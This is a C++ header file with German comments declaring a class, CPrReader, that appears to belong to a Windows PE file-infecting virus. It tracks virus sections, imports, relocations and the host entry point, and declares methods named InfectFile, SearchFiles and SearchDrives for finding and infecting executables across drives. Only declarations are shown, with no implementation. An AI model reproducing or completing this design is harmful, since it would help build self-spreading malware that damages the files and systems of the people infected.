// PrReader.h: Schnittstelle für die Klasse CPrReader.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_PRREADER_H__2B3BDF14_1AEE_4CB3_BCC4_8F59DDF29ECD__INCLUDED_)
#define AFX_PRREADER_H__2B3BDF14_1AEE_4CB3_BCC4_8F59DDF29ECD__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <stdio.h>
#include <windows.h>
#include "wins.h"

typedef struct
{
  WORD RelocOfs : 12;
  WORD RelocType:  4;
} IMAGE_RELOCATION_DATA;


//// Fix for Visual C 5.0 heap
//extern __small_block_heap;


class CPrReader  
{
	////////////
	// Globals
	////////////
	IMAGE_NT_HEADERS PEHeader;
	IMAGE_DOS_HEADER * IDosHeader;
	IMAGE_NT_HEADERS * IPEHeader;
	IMAGE_SECTION_HEADER * ISection;
	IMAGE_SECTION_HEADER * Section;
	int Generation;
	int VirusSections;
	int FirstVirusSection;
	int VirusCodeSection;
	int VirusImportSection;
	DWORD VirusImportSize;
	DWORD VirusRVAImports;
	DWORD HostRVAImports;
	int VirusRelocSection;
	DWORD VirusRelocSize;
	DWORD VirusRelocSizeDir;
	DWORD OfsSections;
	DWORD VirusBaseRVA;
	DWORD VirusEP;
	DWORD HostEP;

public:
	CIPStringArray maImpFuncs;
	CPrReader(HMODULE hm);
	virtual ~CPrReader();
	DWORD GetProcAddressOrd(DWORD Base, DWORD NFunc);
	int ReadPEHeader(HANDLE FHandle);
	DWORD RVA2Ofs(DWORD rva);
	void InfectFile(HANDLE FHandle);
	void SearchFiles(char * Path);
	DWORD WINAPI SearchDrives();
	int MyMessageBox(HWND hWnd, LPSTR Text, LPSTR Caption, UINT Type);
	void Gen1();
};

#endif // !defined(AFX_PRREADER_H__2B3BDF14_1AEE_4CB3_BCC4_8F59DDF29ECD__INCLUDED_)
